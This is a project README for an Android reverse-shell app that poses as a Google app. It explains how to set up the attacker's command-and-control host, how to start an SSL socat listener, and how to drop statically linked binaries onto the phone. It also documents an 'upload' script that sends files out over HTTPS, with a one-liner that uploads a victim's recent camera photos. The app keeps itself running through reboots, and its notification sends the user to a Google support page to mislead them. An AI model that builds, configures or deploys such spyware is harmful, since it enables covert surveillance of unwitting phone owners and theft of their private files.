# revshellSdk28
This is my Android Reverse Shell with dropping capabilities.

The idea was to create a Termux-like environment with a main APK with core functionality, capable of dropping additional executables and scripts.

This app was made for fun and informational purposes only. I strongly discourage any illegal use of the app! Please be responsible.

## Features
- **Secure SSL shell**
- **Persistent** over time and reboots
- **Hidden** and camouflaged with Google apps
- **Drops additional statically linked executable and scripts** based on CPU architecture
- Minimal code with no additional dependencies

Executable and scripts integrated by default:
- `socat` (aarch64 and x86/x64)
- `curl` (aarch64 and x86/x64)
- custom script for file exfiltration over HTTPS (`uplaod`, a file receiver is included in this project; see "httpServerFileReceiver" folder)
- custom script to get device public IP (`ipinfo`)
- custom script to override `whoami` and set a custom "victim id" (`whoami`)

## Performances

The Reverse Shell was tested on Android 8, 11, 12 and 13.

A long time test was successfully performed on a real Android 12 device: the shell has been active for 4 consecutive months without any kind of restart or interruption by the user. During this period, several system reboots and network disconnections were performed to verify the persistence of the app.

## Screenshots
This is the Reverse Shell in action. On the right side you can see the device app drawer: can you guess where is the malicious app? From a visual perspective the reverse shell is perfectly camouflaged with other Google Apps.

![screenshot1](screenshot1.png)

Unfortunately, to guarantee persistence, the app must show a persistent notification (as sneaky as possible):

<img src="screenshot2.png" width="25%">

On notification/app opening the user will be redirected to a Google support page:

<img src="screenshot3.png" width="25%">

## Technical details

### execve

This app is able to execute ELF files using `execve` function. The usage of this function is forbidden on Android Q or higher (API level *>28*).

For more details: https://android-review.googlesource.com/c/platform/system/sepolicy/+/804149

So, in order to compile this app, a target API level between 26 and 28 must be set. This, of course, resulted in a number of limitations so that certain features could not be included or used within the app.

### Statically linked binaries

On the target device there is no possibility to include any sort of dependency for the executable files or compile them from source so the malicious app drops **statically linked binaries** included in the APK at compile time.

To add more binaries you must:
- encode the binary to Base64
- put the encoded file in `./revshellSdk28/app/src/main/res/raw` folder
- modify `./revshellSdk28/app/src/main/java/org/android/settings/Dropper.kt`

  example:
  ```
              val payloads = arrayOf(
                arrayOf("aarch64", "socat" , readRawTextResource(context, R.raw.socat_aarch64)),
                arrayOf("aarch64", "curl"  , readRawTextResource(context, R.raw.curl_aarch64)) ,
                arrayOf("x86_64" , "socat" , readRawTextResource(context, R.raw.socat_x86_64)) ,
                arrayOf("x86_64" , "curl"  , readRawTextResource(context, R.raw.curl_x86_64))  ,
                arrayOf("any"    , "whoami", readRawTextResource(context, R.raw.whoami))       ,
                arrayOf("any"    , "ipinfo", readRawTextResource(context, R.raw.ipinfo))       ,
                arrayOf("any"    , "upload", readRawTextResource(context, R.raw.upload))
            )
  ```
  including (in order) the following parameters:
    - a specific architecture (aquired on the target machine using `uname -m`) or "any"
    - filename that will be written on device storage
    - name of the Resource File in the Android Project

Binaries included by default are not compiled by me! You can find these on various Github repos. Following, some examples:
- https://github.com/polaco1782/linux-static-binaries
- https://github.com/ryanwoodsmall/static-binaries
- https://github.com/mosajjal/binary-tools
- https://github.com/andrew-d/static-binaries

### Command and Control settings
In order to set your C2 server you must modify `./revshellSdk28/app/src/main/java/org/android/settings/MainMaliciousCode.kt`.

You can use an IP or an hostname. Example:
```
    object C2 {
        //const val IP    = "myc2.server.it"
        const val IP    = "123.123.123.123"
        const val RPORT = 443
        const val RETRY = 5
    }
```
Of course you must use a **public address**, set **port forwarding** and firewall rules on your router. Additionally, you can use DNS, Ngrok and other services for reachability and to route your traffic but **how to set this configurations or use those services is out of the scope of this documentation!**

### How to start a session
1. Generate a certificate for the SSL connection on your C2 server:
```
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -out bind.crt
cat bind.key bind.crt > bind.pem
```
2. Create a listener with your favourite tool. Example:
```
sudo socat -d -d OPENSSL-LISTEN:443,cert=bind.pem,verify=0,fork STDOUT
```
Note: this app is not designed to work in a multi-client environment. The easiest thing you can do to use it with multiple devices is to use a different IP port for each infected machine and change the content of `./revshellSdk28/app/src/main/res/raw/whoami` to set a recognizable name for the victim system.

### Notes on the `upload` script
This script permits file exfiltration over HTTPS. 

To perform this task the file is first Urlencoded then uploaded using `curl` with `--insecure` and `--dns-servers` flags.

If the request return `200 OK` the file is already on the server so it's not uploaded again.

The file is located in `./revshellSdk28/app/src/main/res/raw/upload` and **you must modify it to set your C2 server!**

Example on how to upload a file:
```
upload file.bin
```

Example on how to upload most recent photos from the Camera folder:
```
cd ./DCIM/Opencamera && find $(pwd) -type f -mtime -30 -exec upload {} \;
```

Note: *a simple Python HTTP file receiver is included in this project. See "httpServerFileReceiver" folder. Put your certificate in "https" subfolder. Received files are located in "files" subfolder. Edit "server.py" as you wish.*


### Notes on DNS configuration
In the app environment there is no DNS configuration so in order to perform a connection with certain executables you must use an IP or set the DNS Server manually.

For example to use Curl you must use the `--dns-servers` flag.

Example: `curl --dns-servers 8.8.8.8,8.8.4.4 https://google.com`

### Usefull variables
In order to easily navigate on the infected system you can use the following Environment Variables:
- `HOME` set to `/storage/self/primary`
- `DEN` set to `/data/data/org.android.settings`
- `BINS` set to `/data/data/org.android.settings/.files/usr/bin`
- `PATH` set to `${'$'}BINS:${'$'}DEN:${'$'}PATH`

# TODO
Seems like the app notification permission is not enabled by default (you must enable it manually in the system settings) on some devices running Android 13.

This problem is under investigation.
